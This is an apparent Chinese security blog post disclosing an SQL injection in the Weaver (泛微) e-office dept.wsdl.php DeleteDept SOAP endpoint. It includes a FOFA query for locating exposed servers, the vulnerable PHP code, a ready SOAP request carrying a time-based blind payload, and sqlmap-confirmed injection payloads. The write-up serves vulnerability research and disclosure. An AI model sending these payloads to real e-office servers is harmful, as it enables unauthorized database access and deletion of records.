---
title: "泛微e-office dept.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-dept-wsdl-sqli.html
asset_dir: assets/泛微e-office-dept.wsdl.php-sql注入漏洞
---

# 泛微e-office dept.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/20 18:26
* 784浏览
* [0评论](#comment)
* 39分钟阅读

深入探索

webservice

Office

Web服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office dept.wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

同样通过解析 wsdl 后有很多功能

深入探索

SQL

软件

office

[![泛微e-office dept.wsdl.php sql注入漏洞](images/img-001-09cdf05b0ca7.webp)](https://image.mrxn.net/e7c35cc50b3a42cf8bd507415cac8b35.webp)

[webservice](#)-json/dept/dept.wsdl.php 的 `DeleteDept` 业务逻辑如下

编程

```
function DeleteDept( $DeptId )
{
    checkcurrentsession( );
    $Dept = new department( );
    $insertResult = $Dept->deleteDept( $DeptId );
    return $insertResult;
}
```

`$DeptId` 首先带入 `deleteDept` 函数

```
public function deleteDept( $deptid )
    {
        global $connection;
        if ( $deptid == "" )
        {
            return false;
        }
        if ( !$this->checkDeptNoUser( $deptid ) )
        {
            return false;
        }
        $sql = "DELETE FROM department WHERE DEPT_ID='".$deptid."'";
        exequery( $connection, $sql );
        return true;
    }
```

深入探索

Web安全书籍

文件大小转换

漏洞扫描器

又首先进入 `checkDeptNoUser` 函数

```
public function checkDeptNoUser( $deptid )
    {
        global $connection;
        if ( $deptid == "" )
        {
            return false;
        }
        $sql = "SELECT COUNT(*) AS cnt FROM USER WHERE DEPT_ID='".$deptid."'";
        $rs = exequery( $connection, $sql );
        $row = mysql_fetch_array( $rs );
        if ( 0 < $row['cnt'] )
        {
            return false;
        }
        return true;
    }
```

`$deptid` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /webservice-json/dept/dept.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:DepartmentServicewsdl#DeleteDept
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082
Content-Length: 460

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:DepartmentServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:DeleteDept soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <DeptId xsi:type="xsd:string">gero' AND 2462=BENCHMARK(5000000,MD5(0x65486473))-- rXUd</DeptId>
      </urn:DeleteDept>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office dept.wsdl.php sql注入漏洞](images/img-002-0765f5b3e89d.webp)](https://image.mrxn.net/a0a80da311b64fe4b87fe016aba5eddd.webp)

成功在延时 10 秒（因为先进入 checkDeptNoUser 函数再执行deleteDept的select语句，总共执行两次）

代码安全审计

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 418 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:DepartmentServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:DeleteDept soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <DeptId xsi:type="xsd:string">gero' RLIKE (SELECT (CASE WHEN (6681=6681) THEN 0x6765726f ELSE 0x28 END))-- IpLL</DeptId>
      </urn:DeleteDept>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:DepartmentServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:DeleteDept soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <DeptId xsi:type="xsd:string">gero' AND 2462=BENCHMARK(5000000,MD5(0x65486473))-- rXUd</DeptId>
      </urn:DeleteDept>
   </soapenv:Body>
</soapenv:Envelope>
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语句](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office dept.wsdl.php sql注入漏洞](https://mrxn.net/jswz/eoffice-webservice-json-dept-wsdl-sqli.html)  
文章链接：<https://mrxn.net/jswz/eoffice-webservice-json-dept-wsdl-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-dept-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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